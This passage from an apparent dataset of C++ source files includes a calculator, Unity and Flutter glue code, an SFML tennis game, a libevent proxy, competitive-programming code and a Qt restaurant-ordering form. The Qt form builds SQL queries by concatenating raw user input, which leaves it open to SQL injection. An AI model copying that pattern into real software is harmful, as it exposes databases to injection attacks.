\u904e\u671f\u5c01\u5305\u66f4\u65b0\u5b8c\u7562\" << endl; \r\n}\r\nvoid Station::updateRMRU(int curTime, int sim_time, double MaxDR, int Bandwidth)\r\n{\r\n\tdouble trans_rate = (required_dr * sim_time - cur_sum_DR) / (sim_time - curTime);\r\n\tdouble In = required_dr / MaxDR * Bandwidth;\r\n\tMRU_idx = 0;\r\n\tfor(int i = 0; i < upperBoundMRU.size(); i++)\r\n\t{\r\n\t\tif(In < upperBoundMRU[i]){\r\n\t\t\tMRU_idx = i;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n}\r\n\r\n\r\n\r\n",
    "\n#include<iostream>\nusing namespace std;\n\nclass calculator\n{\n\n    private:\n      int n1;\n      int n2;\n      int result;\n\n    public:\n\n     void getdata()\n     {\n        cout<<\"\\nEnter the first number:\";\n        cin>>n1;\n        cout<<\"Enter the second number:\";\n        cin>>n2;\n     }\n\n     void sum()\n     {\n      result=n1+n2;\n      cout<<\"The sum is \"<<result<<endl;  \n     }\n\n     void sub()\n     {\n        result=n1-n2;\n        cout<<\"The difference is \"<<result<<endl;\n     }\n\n     void product()\n     {\n        result=n1*n2;\n        cout<<\"The product is \"<<result<<endl;\n     }\n\n     void division()\n     {\n        result=n1/n2;\n        cout<<\"The qoutient is \"<<result<<endl;\n     }\n\n};\n\nint main()\n{\n    string ch;\n    int op;\n\n    calculator c;;\n\n    while(ch!=\"no\")\n    {\n        cout<<\"1 for addition\\n2 for subtraction\\n3 for multiplication\\n4 for division\\n\";\n        cout<<\"Enter your choice :\";\n        cin>>op;\n\n        switch(op)\n        {\n            case 1:\n              c.getdata();\n              c.sum();\n            break;\n\n            case 2:\n               c.getdata();\n               c.sub();\n            break;\n\n            case 3:\n                c.getdata();\n                c.product();\n            break;\n\n            case 4:\n                c.getdata();\n                c.division();\n            break;\n\n            default:\n             cout<<\"Invalid option\"<<endl ;           \n\n        }\n\n        cout<<\"\\nDo you want to continue[yes/no]:\";\n        cin>>ch;\n        cout<<\"\\n\";\n    }\nreturn 0;\n}",
    "#include \"os/c-api/il2cpp-config-platforms.h\"\n\n#if !IL2CPP_TINY_WITHOUT_DEBUGGER\n\n#include \"os/c-api/Event-c-api.h\"\n#include \"os/Event.h\"\n\nextern \"C\"\n{\n    UnityPalEvent* UnityPalEventNew(int32_t manualReset, int32_t signaled)\n    {\n        return new il2cpp::os::Event(manualReset, signaled);\n    }\n\n    void UnityPalEventDelete(UnityPalEvent* event)\n    {\n        IL2CPP_ASSERT(event);\n        delete event;\n    }\n\n    UnityPalErrorCode UnityPalEventSet(UnityPalEvent* event)\n    {\n        IL2CPP_ASSERT(event);\n        return event->Set();\n    }\n\n    UnityPalErrorCode UnityPalEventReset(UnityPalEvent* event)\n    {\n        IL2CPP_ASSERT(event);\n        return event->Reset();\n    }\n\n    UnityPalWaitStatus UnityPalEventWait(UnityPalEvent* event, int32_t interruptible)\n    {\n        IL2CPP_ASSERT(event);\n        return event->Wait((bool)interruptible);\n    }\n\n    UnityPalWaitStatus UnityPalEventWaitMs(UnityPalEvent* event, uint32_t ms, int32_t interruptible)\n    {\n        IL2CPP_ASSERT(event);\n        return event->Wait(ms, interruptible);\n    }\n\n    UnityPalEventHandle* UnityPalEventHandleNew(UnityPalEvent* event)\n    {\n        IL2CPP_ASSERT(event);\n        return new UnityPalEventHandle(event);\n    }\n\n    void UnityPalEventHandleDelete(UnityPalEventHandle* handle)\n    {\n        IL2CPP_ASSERT(handle);\n        delete handle;\n    }\n\n    int32_t UnityPalEventHandleWait(UnityPalEventHandle* handle)\n    {\n        IL2CPP_ASSERT(handle);\n        return handle->Wait();\n    }\n\n    int32_t UnityPalEventHandleWaitMs(UnityPalEventHandle* handle, uint32_t ms)\n    {\n        IL2CPP_ASSERT(handle);\n        return handle->Wait(ms);\n    }\n\n    void UnityPalEventHandleSignal(UnityPalEventHandle* handle)\n    {\n        IL2CPP_ASSERT(handle);\n        handle->Signal();\n    }\n\n    UnityPalEvent* UnityPalEventHandleGet(UnityPalEventHandle* handle)\n    {\n        IL2CPP_ASSERT(handle);\n        return &handle->Get();\n    }\n}\n\n#endif\n",
    "#include <bits/stdc++.h>\nusing namespace std;\nint randint(int a, int b){\n    return rand()%(b-a+1)+a;\n}\n\n// const int BUF_SZ = 5e6;\n// inline namespace Output {\n// char buf[BUF_SZ];\n// int pos;\n\n// void flush_out() {\n// \tfwrite(buf, 1, pos, stdout);\n// \tpos = 0;\n// }\n\n// void write_char(char c) {\n// \tif (pos == BUF_SZ) { flush_out(); }\n// \tbuf[pos++] = c;\n// }\n\n// void write_int(int x) {\n// \tstatic char num_buf[12];\n// \tif (x < 0) {\n// \t\twrite_char('-');\n// \t\tx *= -1;\n// \t}\n// \tint len = 0;\n// \tfor (; x >= 10; x /= 10) { num_buf[len++] = (char)('0' + (x % 10)); }\n// \twrite_char((char)('0' + x));\n// \twhile (len) { write_char(num_buf[--len]); }\n// }\n\n// // auto-flush output when program exits\n// void init_output() { assert(atexit(flush_out) == 0); }\n// }  // namespace Output\n\nint nums[1001][1001];\nint main(int argc, char* argv[]){\n    assert(argc == 3);\n    int subtask = stoi(argv[1]);\n    srand(stoi(argv[2]));\n    // init_output();\n    int mn = subtask == 1 ? 100 : 1000;\n    int m = randint(mn-5, mn), n = randint(mn-5, mn);\n    for (int i = 0; i < n; i++) {\n        for (int j = 0; j < m; j++) {\n            nums[i][j] = i+1;\n        }\n    }\n    for (int j = 0; j < m; j++) {\n        for (int i = 0; i < n-1; i++) {\n            swap(nums[i][j], nums[i + 1 + randint(0, n-i-2)][j]);\n        }\n    }\n    cout << n << ' ' << m << '\\n';\n    // write_int(n);\n    // write_char(' ');\n    // write_int(m);\n    // write_char('\\n');\n    for (int i = 0; i < n; i++) {\n        for (int j = 0; j < m; j++) {\n            cout << nums[i][j];\n            // write_int(nums[i][j]);\n            if(j != m-1) cout << ' ';//write_char(' ');\n        }\n        cout << '\\n';\n        // write_char('\\n');\n    }\n}",
    "#include \"proxy.h\"\n\nstruct proxy_context *alloc_proxy_context(struct bufferevent *bev) {\n    struct proxy_context *ctx = static_cast<struct proxy_context *>(calloc(1, sizeof(struct proxy_context)));\n    assert(ctx);\n\n    ctx->out_bev = bev;\n    return ctx;\n}\n\nvoid free_proxy_context(struct proxy_context *ctx) { free(ctx); }\n\nvoid proxy_read_cb(struct bufferevent *bev, void *arg) {\n    struct proxy_context *ctx = (struct proxy_context *) arg;\n    struct evbuffer *in = bufferevent_get_input(bev);\n    struct evbuffer *out = bufferevent_get_output(ctx->out_bev);\n\n    evbuffer_add_buffer(out, in);\n}\n\nvoid proxy_event_cb(struct bufferevent *bev, short events, void *arg) {\n    struct proxy_context *proxy_ctx = (struct proxy_context *) arg;\n\n    if (events & BEV_EVENT_ERROR) {\n        LOG_WARN(\"Error from proxy socket: %s\",\n                 evutil_socket_error_to_string(EVUTIL_SOCKET_ERROR()));\n    }\n\n    if (events & (BEV_EVENT_EOF | BEV_EVENT_ERROR)) {\n        if (proxy_ctx->out_bev) {\n            struct context *ctx;\n            bufferevent_getcb(proxy_ctx->out_bev, NULL, NULL, NULL, (void **) &ctx);\n            bufferevent_free(proxy_ctx->out_bev);\n            free_context(ctx);\n        }\n        bufferevent_free(bev);\n        free_proxy_context(proxy_ctx);\n    }\n}\n",
    "////////////////////////////////////////////////////////////\n// Headers\n////////////////////////////////////////////////////////////\n#include <SFML/Graphics.hpp>\n#include <SFML/Audio.hpp>\n#include <cmath>\n#include <ctime>\n#include <cstdlib>\n\n#ifdef SFML_SYSTEM_IOS\n#include <SFML/Main.hpp>\n#endif\n\nstd::string resourcesDir()\n{\n#ifdef SFML_SYSTEM_IOS\n    return \"\";\n#else\n    return \"resources/\";\n#endif\n}\n\n////////////////////////////////////////////////////////////\n/// Entry point of application\n///\n/// \\return Application exit code\n///\n////////////////////////////////////////////////////////////\nint main()\n{\n    std::srand(static_cast<unsigned int>(std::time(NULL)));\n\n    // Define some constants\n    const float pi = 3.14159f;\n    const float gameWidth = 800;\n    const float gameHeight = 600;\n    sf::Vector2f paddleSize(25, 100);\n    float ballRadius = 10.f;\n\n    // Create the window of the application\n    sf::RenderWindow window(sf::VideoMode(static_cast<unsigned int>(gameWidth), static_cast<unsigned int>(gameHeight), 32), \"SFML Tennis\",\n        sf::Style::Titlebar | sf::Style::Close);\n    window.setVerticalSyncEnabled(true);\n\n    // Load the sounds used in the game\n    sf::SoundBuffer ballSoundBuffer;\n    if (!ballSoundBuffer.loadFromFile(resourcesDir() + \"ball.wav\"))\n        return EXIT_FAILURE;\n    sf::Sound ballSound(ballSoundBuffer);\n\n    // Create the SFML logo texture:\n    sf::Texture sfmlLogoTexture;\n    if (!sfmlLogoTexture.loadFromFile(resourcesDir() + \"sfml_logo.png\"))\n        return EXIT_FAILURE;\n    sf::Sprite sfmlLogo;\n    sfmlLogo.setTexture(sfmlLogoTexture);\n    sfmlLogo.setPosition(170, 50);\n\n    // Create the left paddle\n    sf::RectangleShape leftPaddle;\n    leftPaddle.setSize(paddleSize - sf::Vector2f(3, 3));\n    leftPaddle.setOutlineThickness(3);\n    leftPaddle.setOutlineColor(sf::Color::Black);\n    leftPaddle.setFillColor(sf::Color(100, 100, 200));\n    leftPaddle.setOrigin(paddleSize / 2.f);\n\n    // Create the right paddle\n    sf::RectangleShape rightPaddle;\n    rightPaddle.setSize(paddleSize - sf::Vector2f(3, 3));\n    rightPaddle.setOutlineThickness(3);\n    rightPaddle.setOutlineColor(sf::Color::Black);\n    rightPaddle.setFillColor(sf::Color(200, 100, 100));\n    rightPaddle.setOrigin(paddleSize / 2.f);\n\n    // Create the ball\n    sf::CircleShape ball;\n    ball.setRadius(ballRadius - 3);\n    ball.setOutlineThickness(2);\n    ball.setOutlineColor(sf::Color::Black);\n    ball.setFillColor(sf::Color::White);\n    ball.setOrigin(ballRadius / 2, ballRadius / 2);\n\n    // Load the text font\n    sf::Font font;\n    if (!font.loadFromFile(resourcesDir() + \"tuffy.ttf\"))\n        return EXIT_FAILURE;\n\n    // Initialize the pause message\n    sf::Text pauseMessage;\n    pauseMessage.setFont(font);\n    pauseMessage.setCharacterSize(40);\n    pauseMessage.setPosition(170.f, 200.f);\n    pauseMessage.setFillColor(sf::Color::White);\n\n#ifdef SFML_SYSTEM_IOS\n    pauseMessage.setString(\"Welcome to SFML Tennis!\\nTouch the screen to start the game.\");\n#else\n    pauseMessage.setString(\"Welcome to SFML Tennis!\\nPress space to start the game.\");\n#endif\n\n    // Initialize the score display\n    int leftScore = 0;\n    int rightScore = 0;\n    sf::Text scoreText;\n    scoreText.setFont(font);\n    scoreText.setCharacterSize(30);\n    scoreText.setFillColor(sf::Color::White);\n    scoreText.setPosition(gameWidth / 2 - 50, 10);\n    scoreText.setString(\"0 - 0\");\n\n    // Initialize the difficulty selection\n    int difficulty = 1; // Default difficulty level\n    const float easySpeed = 200.f;\n    const float mediumSpeed = 400.f;\n    const float hardSpeed = 600.f;\n    float ballSpeed = mediumSpeed;\n\n    sf::Text difficultyMessage;\n    difficultyMessage.setFont(font);\n    difficultyMessage.setCharacterSize(30);\n    difficultyMessage.setPosition(170.f, 400.f); // Adjusted position to avoid overlap\n    difficultyMessage.setFillColor(sf::Color::White);\n    difficultyMessage.setString(\"Select Difficulty: 1 (Easy), 2 (Medium), 3 (Hard)\");\n\n    sf::Text selectedDifficultyMessage;\n    selectedDifficultyMessage.setFont(font);\n    selectedDifficultyMessage.setCharacterSize(30);\n    selectedDifficultyMessage.setPosition(170.f, 450.f); // Adjusted position to avoid overlap\n    selectedDifficultyMessage.setFillColor(sf::Color::White);\n    selectedDifficultyMessage.setString(\"Difficulty: Medium\");\n\n    // Define the paddles properties\n    sf::Clock AITimer;\n    const sf::Time AITime = sf::seconds(0.1f);\n    const float paddleSpeed = 400.f;\n    float rightPaddleSpeed = 0.f;\n    float ballAngle = 0.f; // to be changed later\n\n    sf::Clock clock;\n    bool isPlaying = false;\n    bool isPaused = false;\n    while (window.isOpen())\n    {\n        // Handle events\n        sf::Event event;\n        while (window.pollEvent(event))\n        {\n            // Window closed or escape key pressed: exit\n            if ((event.type == sf::Event::Closed) ||\n                ((event.type == sf::Event::KeyPressed) && (event.key.code == sf::Keyboard::Escape)))\n           ",
    "\ufeff// Day03.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\n#include <string>\n#include <vector>\n#include \"ThemeSong.h\"\n\nstd::string postFix(std::string fileName, int postFixNumber = 1) //postFixNumber is optional\n{\n    return fileName + \"_\" + std::to_string(postFixNumber);\n}\n\n\n\nint main()\n{\n\n    ThemeSong themes;\n    themes.BatTheme();\n    themes.BatTheme(255);\n\n    /*\n        \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n        \u2551Parameters: optional parameters\u2551\n        \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n        https://www.geeksforgeeks.org/default-arguments-c/\n\n        Unless specified, parameters to a method are required.\n        However, you can make parameters optional, meaning when calling the method, you aren't required to pass values for the optional parameters.\n\n        REQUIREMENT:\n            - all optional parameters have to be at the end of the list of parameters\n            - in the list of parameters, assign a value to any parameter you want to be optional\n    */\n    std::string file = \"highScores\";\n\n    std::string postfile = postFix(file); //if you don't pass a value, the default value will be used for the optional parameter\n    std::cout << postfile << \"\\n\";\n\n    postfile = postFix(file, 5); //if a value is passed, it will be used for the optional parameter\n    std::cout << postfile << \"\\n\";\n\n\n\n    /*\n        CHALLENGE 1:\n\n            \n            Add a method called batTheme to the Themesong class.\n            Add an default parameter to determine how many \"na\" are printed. \n            The default value should be 13.\n            \n            If the calling code does not pass a value for the parameter, \n            print \"na na na na na na na na na na na na na Batman\".\n            If a value is passed, print the number of \"na\" equal to the value.\n            EX: if 6 is passed, print \"na na na na na na Batman\"\n\n    */\n\n\n\n\n\n    /*\n        \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n        \u2551 vector<T> \u2551\n        \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\n        [  copying a vector  ]\n        https://www.geeksforgeeks.org/ways-copy-vector-c/\n\n        here are 3 ways to copy a vector:\n        1) copy each element manually\n        2) assignment \"=\" operator\n        3) passing a vector to the constructor of another vector\n\n    */\n    std::vector<int> scores = { 1,2,3,4,5 };\n\n    //1) copy each element manually\n    std::vector<int> scores2;\n    for (size_t i = 0; i < scores.size(); i++)\n        scores2.push_back(scores[i]);\n\n    //2) assignment \"=\" operator\n    std::vector<int> scores3 = scores;\n\n    //3) passing a vector to the constructor of another vector\n    std::vector<int> scores4(scores);\n\n\n\n    /*\n        CHALLENGE 2:\n\n            Copy the JLA vector and add some villains to the new vector. \n            Don't modify the original JLA vector.\n    */\n    std::vector<std::string> JLA = { \"Batman\", \"Wonder Woman\", \"Superman\", \"Flash\" };\n    auto jla2(JLA);\n\n}",
    "#include <Arduino.h>\r\n\r\ntypedef enum {\r\n    schloss1,\r\n    schloss2,\r\n    schloss3,\r\n    safe_open,\r\n    safe_locked\r\n} Zustand_t;\r\n\r\ntypedef enum {\r\n    key1,\r\n    key2,\r\n    key3,\r\n    input_refused,\r\n    door_open,\r\n    close_door\r\n} Event_t;\r\n\r\nZustand_t zustand = safe_locked;\r\n\r\nvoid setup() \r\n{\r\n    \r\n}\r\n\r\nvoid loop() \r\n{\r\n    \r\n}\r\n\r\nvoid zustand_safe(Event_t event) \r\n{\r\n    \r\n    switch (zustand) {\r\n        case safe_locked:\r\n            if (event == key1) {\r\n                zustand = schloss1;\r\n                Serial.println(\"Transition to schloss1\");\r\n            }\r\n            break;\r\n        case schloss1:\r\n            if (event == key2) {\r\n                zustand = schloss2;\r\n                Serial.println(\"Transition to schloss2\");\r\n            }\r\n            break;\r\n        case schloss2:\r\n            if (event == key3) {\r\n                zustand = safe_open;\r\n                Serial.println(\"Safe is open\");\r\n            }\r\n            break;\r\n        case safe_open:\r\n            if (event == close_door) {\r\n                zustand = safe_locked;\r\n                Serial.println(\"Safe is locked\");\r\n            }\r\n            break;\r\n        default:\r\n            break;\r\n    }\r\n}\r\n\r\n\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_shakur_jobsheet7\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/* \n\n    \u0950 \u0939\u094c\u0902 \u091c\u0942\u0902 \u0938\u0903 \u0950 \u092d\u0942\u0930\u094d\u092d\u0941\u0935\u0903 \u0938\u094d\u0935\u0903 \n    \u0950 \u0924\u094d\u0930\u094d\u092f\u092e\u094d\u092c\u0915\u0902 \u092f\u091c\u093e\u092e\u0939\u0947 \u0938\u0941\u0917\u0928\u094d\u0927\u093f\u0902 \u092a\u0941\u0937\u094d\u091f\u093f\u0935\u0930\u094d\u0927\u0928\u092e\u094d \u0909\u0930\u094d\u0935\u093e\u0930\u0941\u0915\u092e\u093f\u0935 \u092c\u0928\u094d\u0927\u0928\u093e\u0928\u094d\u092e\u0943\u0924\u094d\u092f\u094b\u0930\u094d\u092e\u0941\u0915\u094d\u0937\u0940\u092f \u092e\u093e\u092e\u0943\u0924\u093e\u0924\u094d \n    \u0950 \u0938\u094d\u0935\u0903 \u092d\u0941\u0935\u0903 \u092d\u0942\u0903 \u0950 \u0938\u0903 \u091c\u0942\u0902 \u0939\u094c\u0902 \u0950\n\n   @Author  : Akshat Madhavan\n   @Country : INDIA \n   \n*/\n\n#include<bits/stdc++.h>\nusing namespace std;\n\n#define ll long long\n#define all(x) x.begin(), x.end()\n\n#ifdef AKSHAT\n#include \"debug.h\"\n#define deb(x...) cerr << \"[\" << #x << \"] = [\"; _print(x)\n#else\n#define deb(x...)\n#endif\n\n\ntemplate<class T>void output (vector<T> &a) {for (auto &x : a) {cout << x << ' ';}cout << '\\n';}\ntemplate<typename T> void chmin (T &a, T b) {if (a > b) swap(a, b);}\ntemplate<typename T> void chmax (T &a, T b) {if (a < b) swap(a, b);}\n\n\n\nvoid solve() {\n    int n, m;\n    cin >> n >> m;\n\n    vector<vector<int>> a(n, vector<int>(m));\n    for (auto &row : a)\n        for (auto &ele : row)\n            cin >> ele, --ele;\n\n    vector<vector<int>> b(n, vector<int>(m));\n    for (auto &row : b)\n        for (auto &ele : row)\n            cin >> ele, --ele;\n\n\n    /*\n        let's find the og col and og row\n    */\n\n    vector<int> a_row_min(n, n * m), a_col_min(m, n * m);\n    vector<int> b_row_min(n, n * m), b_col_min(m, n * m);\n    for (int i = 0; i < n; ++i) {\n        for (int j = 0; j < m; ++j) {\n            a_row_min[i] = min(a_row_min[i], a[i][j]);\n            a_col_min[j] = min(a_col_min[j], a[i][j]);\n            b_row_min[i] = min(b_row_min[i], b[i][j]);\n            b_col_min[j] = min(b_col_min[j], b[i][j]);      \n        }\n    }\n\n    vector<int> row_index(n * m);\n    for (int i = 0; i < n; ++i) {\n        row_index[a_row_min[i]] = i;\n    }\n\n    vector<int> col_index(n * m);\n    for (int i = 0; i < m; ++i) {\n        col_index[a_col_min[i]] = i;\n    }\n\n    vector<vector<int>> new_a(n, vector<int>(m));\n    for (int i = 0; i < n; ++i) {\n        // deb(b_row_min[i]);\n        vector<int> cur = a[row_index[b_row_min[i]]];\n        for (int j = 0; j < m; ++j) {\n            new_a[i][j] = cur[col_index[b_col_min[j]]];\n        }\n    }\n\n    for (int i = 0; i < n; ++i) {\n        for (int j = 0; j < m; ++j) {\n            // cout<<new_a[i][j]+1<<\" \\n\"[j==m-1];\n            if (new_a[i][j] != b[i][j]) {\n                cout << \"NO\\n\";\n                return;\n            }\n        }\n    }\n\n    cout << \"YES\\n\";\n} \n\n\nint32_t main() {\n    \n    ios_base::sync_with_stdio(0);cin.tie(0);cout.tie(0);\n\n    #ifdef AKSHAT   \n        freopen(\"error.txt\", \"w\", stderr);  \n    #endif  \n\n    int tc = 1;\n    cin >> tc;\n    for (int cases = 1; cases <= tc; ++cases) {\n        solve();\n        // cout << (solve() ? \"YES\\n\" : \"NO\\n\");\n        // cout << \"Case # \" << cases;\n    } \n\n    #ifdef AKSHAT\n        double timeTaken = 1000.0 * clock() / CLOCKS_PER_SEC;\n        cout << \"\\n[Finished in \" << timeTaken << \"ms]\";\n        cerr << \"\\n[Finished in \" << timeTaken << \"ms]\";\n    #endif\n\n    return 0;\n}\n\n//JAI SHREE RAM !!!!\n",
    "#include \"token_order.h\"\r\n#include \"ui_token_order.h\"\r\n#include \"widget.h\"\r\n\r\nToken_order::Token_order(QWidget *parent) :\r\n    QWidget(parent),\r\n    ui(new Ui::Token_order)\r\n{\r\n    ui->setupUi(this);\r\n\r\n    ok = new Token_ok;\r\n\r\n    // \u521d\u59cb\r\n    //Widget::order->setQuery();\r\n    //ui->token_menu->setModel(Widget::order);\r\n\r\n    order.setHorizontalHeaderLabels({\"\u7f16\u53f7\", \"\u540d\u79f0\", \"\u5206\u7c7b\",\"\u4ef7\u683c\",\"\u4efd\u6570\",\"\u8981\u6c42\"});\r\n\r\n}\r\n\r\nToken_order::~Token_order()\r\n{\r\n    delete ui;\r\n}\r\n\r\n// \u56de\u5230\u4e3b\u754c\u9762\r\nvoid Token_order::on_backtomain_clicked()\r\n{\r\n    emit this->Token_back();\r\n}\r\n\r\n// \u786e\u8ba4\u4e0b\u5355\u754c\u9762\r\nvoid Token_order::on_okorder_clicked()\r\n{\r\n    // \u8ba2\u5355\u4e3a\u7a7a\r\n    if(order.rowCount() == 0){\r\n        QMessageBox::information(this, \"\u8ba2\u5355\u4e3a\u7a7a\", \"\u60a8\u8fd8\u6ca1\u6709\u70b9\u9910\u54e6~\");\r\n        return;\r\n    }\r\n    else{\r\n        // \u63d2\u5165\u987e\u5ba2\r\n        // \u521b\u5efa\u63d2\u5165\u8bed\u53e5\r\n        QSqlQuery query;\r\n        QString str = custom_id + \",'\u5c31\u9910'\";\r\n        QString insert = \"insert into customers(\u987e\u5ba2\u7f16\u53f7, \u987e\u5ba2\u72b6\u6001) values(\" + str + \");\";\r\n        // \u6267\u884c\r\n        query.exec(insert);\r\n        // \u63d2\u5165\u5916\u5e26\u987e\u5ba2\r\n        insert = \"insert into token_customers(\u5916\u5e26\u987e\u5ba2\u7f16\u53f7) values(\" +custom_id+ \");\";\r\n        // \u6267\u884c\r\n        query.exec(insert);\r\n\r\n        // \u63d2\u5165\u8ba2\u5355\r\n        str = order_id + \",\" +custom_id;\r\n        insert = \"insert into orders(\u8ba2\u5355\u7f16\u53f7,\u987e\u5ba2\u7f16\u53f7) values(\" +str+ \");\";\r\n        // \u6267\u884c\r\n        query.exec(insert);\r\n        // \u5c06\u6240\u6709\u83dc\u54c1\u63d2\u5165\u5305\u542b\r\n        int rowCount = order.rowCount();  // \u83b7\u53d6\u884c\u6570\r\n        // \u5faa\u73af\u83b7\u53d6order_now\u4e2d\u4fe1\u606f\u8fdb\u884c\u63d2\u5165\r\n        for (int i = 0; i < rowCount; ++i)\r\n        {\r\n            //\"\u83dc\u54c1\u7f16\u53f7\", \"\u83dc\u54c1\u540d\u79f0\", \"\u83dc\u54c1\u5206\u7c7b\",\"\u83dc\u54c1\u4ef7\u683c\",\"\u4efd\u6570\",\"\u8981\u6c42\"\r\n            QString id = order.item(i, 0)->text(); // \u83b7\u53d6\u7b2c i \u884c\u7b2c\u4e00\u5217,\u83dc\u54c1\u7f16\u53f7\r\n            QString num = order.item(i, 4)->text(); // \u83b7\u53d6\u7b2c i \u884c\u7b2c\u4e94\u5217,\u4efd\u6570\r\n            QString dem = order.item(i, 5)->text(); // \u83b7\u53d6\u7b2c i \u884c\u7b2c\u516d\u5217,\u53e3\u5473\r\n\r\n            str = order_id + \",\" + id + \",\" + num + \",'\" + dem + \"'\";\r\n            insert = \"insert into contain(\u8ba2\u5355\u7f16\u53f7,\u83dc\u54c1\u7f16\u53f7,\u4efd\u6570,\u53e3\u5473) values(\" +str+ \");\";\r\n\r\n            query.exec(insert);\r\n\r\n        }\r\n\r\n        // \u4f20\u9012order_id\u4e0ecustom_id\r\n        this->ok->acceptid(order_id,custom_id);\r\n\r\n        this->hide();\r\n        this->ok->show();\r\n    }\r\n}\r\n\r\n\r\n// \u6309\u7167\u540d\u79f0\u8fdb\u884c\u67e5\u8be2\r\nvoid Token_order::on_nameselect_button_clicked()\r\n{\r\n    QSqlQuery query;\r\n    QString select;\r\n\r\n    // \u5982\u679c\u6709\u67e5\u8be2\u6761\u4ef6\r\n    if( ui->selectline->text() != \"\")\r\n    {\r\n        select = select + \"select `\u83dc\u54c1\u7f16\u53f7`, `\u83dc\u54c1\u540d\u79f0`,`\u83dc\u54c1\u5206\u7c7b`, `\u83dc\u54c1\u4ef7\u683c` \"\r\n                                  \"from dishes \"\r\n                                  \"where \u83dc\u54c1\u540d\u79f0 like '%\" + ui->selectline->text() +\"%';\";\r\n\r\n    }\r\n    // \u7a7a\u67e5\u8be2\u6761\u4ef6\uff0c\u67e5\u6240\u6709\r\n    else{\r\n        select = \"select `\u83dc\u54c1\u7f16\u53f7`, `\u83dc\u54c1\u540d\u79f0`,`\u83dc\u54c1\u5206\u7c7b`, `\u83dc\u54c1\u4ef7\u683c` from dishes;\";\r\n\r\n        // \u663e\u793a\u6298\u6263\u5546\u54c1\r\n        sale->setQuery(\"select `\u83dc\u54c1\u7f16\u53f7`, `\u83dc\u54c1\u540d\u79f0`, `\u83dc\u54c1\u4ef7\u683c`, `\u4f18\u60e0\u4fe1\u606f` \"\r\n                       \"from dishes \"\r\n                       \"where \u4f18\u60e0\u4fe1\u606f<1;\");\r\n        ui->sale_today->setModel(sale);\r\n    }\r\n\r\n    //QMessageBox::information(this, \"\u6267\u884c\u8bed\u53e5\", select);\r\n\r\n    menu->setQuery(select);\r\n    ui->token_menu->setModel(menu);\r\n}\r\n\r\n// \u6309\u7167\u5206\u7c7b\u8fdb\u884c\u67e5\u8be2\r\nvoid Token_order::on_typeselect_button_clicked()\r\n{\r\n    QString select;\r\n\r\n    // \u5982\u679c\u6709\u67e5\u8be2\u6761\u4ef6\r\n    if( ui->selectline->text() != \"\")\r\n    {\r\n        select = select + \"select `\u83dc\u54c1\u7f16\u53f7`, `\u83dc\u54c1\u540d\u79f0`,`\u83dc\u54c1\u5206\u7c7b`, `\u83dc\u54c1\u4ef7\u683c` \"\r\n                                  \"from dishes \"\r\n                                  \"where \u83dc\u54c1\u5206\u7c7b like '%\" + ui->selectline->text() +\"%';\";\r\n\r\n    }\r\n    // \u7a7a\u67e5\u8be2\u6761\u4ef6\uff0c\u67e5\u6240\u6709\r\n    else{\r\n        select = \"select `\u83dc\u54c1\u7f16\u53f7`, `\u83dc\u54c1\u540d\u79f0`,`\u83dc\u54c1\u5206\u7c7b`, `\u83dc\u54c1\u4ef7\u683c` from dishes;\";\r\n\r\n        // \u663e\u793a\u6298\u6263\u5546\u54c1\r\n        sale->setQuery(\"select `\u83dc\u54c1\u7f16\u53f7`, `\u83dc\u54c1\u540d\u79f0`, `\u83dc\u54c1\u4ef7\u683c`, `\u4f18\u60e0\u4fe1\u606f` \"\r\n                       \"from dishes \"\r\n                       \"where \u4f18\u60e0\u4fe1\u606f<1;\");\r\n        ui->sale_today->setModel(sale);\r\n    }\r\n\r\n    //QMessageBox::information(this, \"\u6267\u884c\u8bed\u53e5\", select);\r\n\r\n    menu->setQuery(select);\r\n    ui->token_menu->setModel(menu);\r\n}\r\n\r\n// \u5c06\u83dc\u54c1\u52a0\u5165\u5f53\u524d\u8ba2\u5355\u663e\u793a\r\nvoid Token_order::on_Insert_button_clicked()\r\n{\r\n    QString id = ui->token_dishid->toPlainText();  //\u5f53\u524d\u83dc\u54c1\u7f16\u53f7\r\n    int rowCount = order.rowCount();  // \u83b7\u53d6\u884c\u6570\r\n    // \u5728\u8868\u4e2d\u67e5\u627e\u5f53\u524d\u83dc\u54c1\u662f\u5426\u5df2\u7ecf\u5728\u8ba2\u5355\u4e2d\r\n    for (int i = 0; i < rowCount; ++i)\r\n    {\r\n        QStandardItem* item = order.item(i, 0); // \u83b7\u53d6\u7b2c i \u884c\u7b2c\u4e00\u5217\u7684\u9879\u76ee\r\n        // \u5df2\u7ecf\u5b58\u5728\r\n        